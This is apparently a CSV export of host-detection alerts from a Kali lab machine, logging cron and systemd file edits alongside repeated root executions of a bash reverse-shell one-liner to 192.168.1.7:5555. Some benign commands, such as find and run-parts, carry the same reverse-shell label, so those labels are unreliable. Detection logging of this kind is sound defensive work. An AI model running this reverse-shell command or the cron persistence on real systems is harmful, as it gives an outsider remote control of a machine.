Time,host,user,"Command Line",Executable,"Event Type",Description
"1748437489.785",kali,kali,rm,"/usr/bin/rm","Systemd Modification","Systemd unit file modified using /usr/bin/rm"
"1748437471.029",kali,kali,leafpad,"/usr/bin/leafpad","Cron Modification","Cron file modified using /usr/bin/leafpad"
"1748437471.029",kali,kali,leafpad,"/usr/bin/leafpad","Cron Modification","Cron file modified using /usr/bin/leafpad"
"1748437471.025",kali,kali,leafpad,"/usr/bin/leafpad","Cron Modification","Cron file modified using /usr/bin/leafpad"
"1748437471.025",kali,kali,leafpad,"/usr/bin/leafpad","Cron Modification","Cron file modified using /usr/bin/leafpad"
"1748437470.561",kali,kali,leafpad,"/usr/bin/leafpad","Cron Modification","Cron file modified using /usr/bin/leafpad"
"1748437467.693",kali,kali,leafpad,"/usr/bin/leafpad","Cron Modification","Cron file modified using /usr/bin/leafpad"
"1748437441.806448",kali,root,"/bin/sh -c /bin/bash -i &gt;&amp; /dev/tcp/192.168.1.7/5555 0&gt;&amp;1","/usr/bin/dash","Suspicious Bash Execution","Reverse shell attempt via bash"
"1748437392.489",kali,kali,zsh,"/usr/bin/zsh","Systemd Modification","Systemd unit file modified using /usr/bin/zsh"
"1748437389.905",kali,kali,tee,"/usr/bin/tee","Cron Modification","Cron file modified using /usr/bin/tee"
"1748437260.629818",kali,root,"/bin/sh /etc/console-setup/cached_setup_terminal.sh vcs8","/usr/bin/dash","Suspicious Bash Execution","Reverse shell attempt via bash"
"1748436637.963",kali,kali,leafpad,"/usr/bin/leafpad","Cron Modification","Cron file modified using /usr/bin/leafpad"
"1748436637.963",kali,kali,leafpad,"/usr/bin/leafpad","Cron Modification","Cron file modified using /usr/bin/leafpad"
"1748436637.963",kali,kali,leafpad,"/usr/bin/leafpad","Cron Modification","Cron file modified using /usr/bin/leafpad"
"1748436637.963",kali,kali,leafpad,"/usr/bin/leafpad","Cron Modification","Cron file modified using /usr/bin/leafpad"
"1748436637.191",kali,kali,leafpad,"/usr/bin/leafpad","Cron Modification","Cron file modified using /usr/bin/leafpad"
"1748436633.175",kali,kali,leafpad,"/usr/bin/leafpad","Cron Modification","Cron file modified using /usr/bin/leafpad"
"1748436602.256330",kali,root,"/bin/sh -c /bin/bash -i &gt;&amp; /dev/tcp/192.168.1.7/5555 0&gt;&amp;1","/usr/bin/dash","Suspicious Bash Execution","Reverse shell attempt via bash"
"1748436602.178671",kali,root,"/bin/sh -c /bin/bash -i &gt;&amp; /dev/tcp/192.168.1.7/5555 0&gt;&amp;1","/usr/bin/dash","Suspicious Bash Execution","Reverse shell attempt via bash"
"1748436541.604711",kali,root,"/bin/sh -c /bin/bash -i &gt;&amp; /dev/tcp/192.168.1.7/5555 0&gt;&amp;1","/usr/bin/dash","Suspicious Bash Execution","Reverse shell attempt via bash"
"1748436541.604137",kali,root,"/bin/sh -c /bin/bash -i &gt;&amp; /dev/tcp/192.168.1.7/5555 0&gt;&amp;1","/usr/bin/dash","Suspicious Bash Execution","Reverse shell attempt via bash"
"1748436481.523504",kali,root,"/bin/sh -c /bin/bash -i &gt;&amp; /dev/tcp/192.168.1.7/5555 0&gt;&amp;1","/usr/bin/dash","Suspicious Bash Execution","Reverse shell attempt via bash"
"1748436481.513752",kali,root,"/bin/sh -c /bin/bash -i &gt;&amp; /dev/tcp/192.168.1.7/5555 0&gt;&amp;1","/usr/bin/dash","Suspicious Bash Execution","Reverse shell attempt via bash"
"1748436421.437094",kali,root,"/bin/sh -c /bin/bash -i &gt;&amp; /dev/tcp/192.168.1.7/5555 0&gt;&amp;1","/usr/bin/dash","Suspicious Bash Execution","Reverse shell attempt via bash"
"1748436421.432037",kali,root,"/bin/sh -c /bin/bash -i &gt;&amp; /dev/tcp/192.168.1.7/5555 0&gt;&amp;1","/usr/bin/dash","Suspicious Bash Execution","Reverse shell attempt via bash"
"1748436407.539",kali,kali,zsh,"/usr/bin/zsh","Systemd Modification","Systemd unit file modified using /usr/bin/zsh"
"1748436361.356189",kali,root,"/bin/sh -c /bin/bash -i &gt;&amp; /dev/tcp/192.168.1.7/5555 0&gt;&amp;1","/usr/bin/dash","Suspicious Bash Execution","Reverse shell attempt via bash"
"1748436361.355009",kali,root,"/bin/sh -c /bin/bash -i &gt;&amp; /dev/tcp/192.168.1.7/5555 0&gt;&amp;1","/usr/bin/dash","Suspicious Bash Execution","Reverse shell attempt via bash"
"1748436301.217952",kali,root,"/bin/sh -c /bin/bash -i &gt;&amp; /dev/tcp/192.168.1.7/5555 0&gt;&amp;1","/usr/bin/dash","Suspicious Bash Execution","Reverse shell attempt via bash"
"1748436301.212761",kali,root,"/bin/sh -c /bin/bash -i &gt;&amp; /dev/tcp/192.168.1.7/5555 0&gt;&amp;1","/usr/bin/dash","Suspicious Bash Execution","Reverse shell attempt via bash"
"1748436241.101436",kali,root,"/bin/sh -c /bin/bash -i &gt;&amp; /dev/tcp/192.168.1.7/5555 0&gt;&amp;1","/usr/bin/dash","Suspicious Bash Execution","Reverse shell attempt via bash"
"1748436241.101095",kali,root,"/bin/sh -c /bin/bash -i &gt;&amp; /dev/tcp/192.168.1.7/5555 0&gt;&amp;1","/usr/bin/dash","Suspicious Bash Execution","Reverse shell attempt via bash"
"1748436182.016030",kali,root,"/bin/sh -c /bin/bash -i &gt;&amp; /dev/tcp/192.168.1.7/5555 0&gt;&amp;1","/usr/bin/dash","Suspicious Bash Execution","Reverse shell attempt via bash"
"1748436182.015766",kali,root,"/bin/sh -c /bin/bash -i &gt;&amp; /dev/tcp/192.168.1.7/5555 0&gt;&amp;1","/usr/bin/dash","Suspicious Bash Execution","Reverse shell attempt via bash"
"1748436121.940624",kali,root,"/bin/sh -c /bin/bash -i &gt;&amp; /dev/tcp/192.168.1.7/5555 0&gt;&amp;1","/usr/bin/dash","Suspicious Bash Execution","Reverse shell attempt via bash"
"1748436121.940216",kali,root,"/bin/sh -c /bin/bash -i &gt;&amp; /dev/tcp/192.168.1.7/5555 0&gt;&amp;1","/usr/bin/dash","Suspicious Bash Execution","Reverse shell attempt via bash"
"1748436061.857523",kali,root,"/bin/sh -c /bin/bash -i &gt;&amp; /dev/tcp/192.168.1.7/5555 0&gt;&amp;1","/usr/bin/dash","Suspicious Bash Execution","Reverse shell attempt via bash"
"1748436061.854399",kali,root,"/bin/sh -c /bin/bash -i &gt;&amp; /dev/tcp/192.168.1.7/5555 0&gt;&amp;1","/usr/bin/dash","Suspicious Bash Execution","Reverse shell attempt via bash"
"1748436001.714634",kali,root,"/bin/sh -c /bin/bash -i &gt;&amp; /dev/tcp/192.168.1.7/5555 0&gt;&amp;1","/usr/bin/dash","Suspicious Bash Execution","Reverse shell attempt via bash"
"1748436001.708416",kali,root,"/bin/sh -c /bin/bash -i &gt;&amp; /dev/tcp/192.168.1.7/5555 0&gt;&amp;1","/usr/bin/dash","Suspicious Bash Execution","Reverse shell attempt via bash"
"1748435941.626444",kali,root,"/bin/sh -c /bin/bash -i &gt;&amp; /dev/tcp/192.168.1.7/5555 0&gt;&amp;1","/usr/bin/dash","Suspicious Bash Execution","Reverse shell attempt via bash"
"1748435941.615896",kali,root,"/bin/sh -c /bin/bash -i &gt;&amp; /dev/tcp/192.168.1.7/5555 0&gt;&amp;1","/usr/bin/dash","Suspicious Bash Execution","Reverse shell attempt via bash"
"1748435890.248",kali,kali,tee,"/usr/bin/tee","Cron Modification","Cron file modified using /usr/bin/tee"
"1748435881.540076",kali,root,"/bin/sh -c /bin/bash -i &gt;&amp; /dev/tcp/192.168.1.7/5555 0&gt;&amp;1","/usr/bin/dash","Suspicious Bash Execution","Reverse shell attempt via bash"
"1748435840.942",kali,kali,,,"Systemd Modification",""
"1748435840.942",kali,kali,,,"Cron Modification",""
"1748435840.942",kali,kali,,,"Cron Modification",""
"1748435840.942",kali,kali,,,"Cron Modification",""
"1748435840.934",kali,kali,,,"Systemd Modification",""
"1748435840.934",kali,kali,,,"Cron Modification",""
"1748435840.934",kali,kali,,,"Cron Modification",""
"1748435840.934",kali,kali,,,"Cron Modification",""
"1748435839.021247",kali,root,"find /root/.nvm/alias /root/.nvm/bash_completion /root/.nvm/CODE_OF_CONDUCT.md /root/.nvm/CONTRIBUTING.md /root/.nvm/Dockerfile /root/.nvm/GOVERNANCE.md /root/.nvm/install.sh /root/.nvm/LICENSE.md /root/.nvm/Makefile /root/.nvm/nvm-exec /root/.nvm/nvm.sh /root/.nvm/package.json /root/.nvm/PROJECT_CHARTER.md /root/.nvm/README.md /root/.nvm/rename_test.sh /root/.nvm/ROADMAP.md /root/.nvm/test /root/.nvm/update_test_mocks.sh /root/.nvm/versions /root/.nvm/versions/node/v14.21.3 /root/.nvm/versions/node/v18.20.4 /root/.nvm/versions/node/v14.21.3 /root/.nvm/versions/node/v18.20.4 -name . -o -type d -prune -o -path v14.*","/usr/bin/find","Suspicious Bash Execution","Reverse shell attempt via bash"
"1748435821.474607",kali,root,"/bin/sh -c /bin/bash -i &gt;&amp; /dev/tcp/192.168.1.7/5555 0&gt;&amp;1","/usr/bin/dash","Suspicious Bash Execution","Reverse shell attempt via bash"
"1748435761.405724",kali,root,"/bin/sh -c /bin/bash -i &gt;&amp; /dev/tcp/192.168.1.7/5555 0&gt;&amp;1","/usr/bin/dash","Suspicious Bash Execution","Reverse shell attempt via bash"
"1748435752.870969",kali,root,"find /root/.nvm/alias /root/.nvm/bash_completion /root/.nvm/CODE_OF_CONDUCT.md /root/.nvm/CONTRIBUTING.md /root/.nvm/Dockerfile /root/.nvm/GOVERNANCE.md /root/.nvm/install.sh /root/.nvm/LICENSE.md /root/.nvm/Makefile /root/.nvm/nvm-exec /root/.nvm/nvm.sh /root/.nvm/package.json /root/.nvm/PROJECT_CHARTER.md /root/.nvm/README.md /root/.nvm/rename_test.sh /root/.nvm/ROADMAP.md /root/.nvm/test /root/.nvm/update_test_mocks.sh /root/.nvm/versions /root/.nvm/versions/node/v14.21.3 /root/.nvm/versions/node/v18.20.4 /root/.nvm/versions/node/v14.21.3 /root/.nvm/versions/node/v18.20.4 -name . -o -type d -prune -o -path v14.*","/usr/bin/find","Suspicious Bash Execution","Reverse shell attempt via bash"
"1748435711.250629",kali,kali,"run-parts --list --regex ^[a-zA-Z0-9_][a-zA-Z0-9._-]*\.sh$ /etc/profile.d","/usr/bin/run-parts","Suspicious Bash Execution","Reverse shell attempt via bash"
"1748435701.679803",kali,root,"/bin/sh -c /bin/bash -i &gt;&amp; /dev/tcp/192.168.1.7/5555 0&gt;&amp;1","/usr/bin/dash","Suspicious Bash Execution","Reverse shell attempt via bash"
